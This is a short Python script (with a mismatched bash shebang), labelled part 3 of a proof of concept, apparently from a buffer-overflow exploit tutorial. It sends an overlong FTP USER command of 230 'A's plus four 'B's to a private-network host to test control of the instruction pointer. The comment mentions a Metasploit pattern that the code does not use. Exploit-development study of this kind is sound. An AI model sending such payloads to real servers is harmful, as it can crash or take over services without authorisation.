#!/bin/bash
import socket

# Part 3 of proof of concept by Vry4n
# This script is intended send a pattern created with Metasploit pattern_create.rb script

FUZZ = "A" * 230
EIP = "B" * 4

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.5", 21))
s.recv(1024)
s.send(b"USER " + FUZZ.encode() + EIP.encode() + b"\r\n")
s.close()
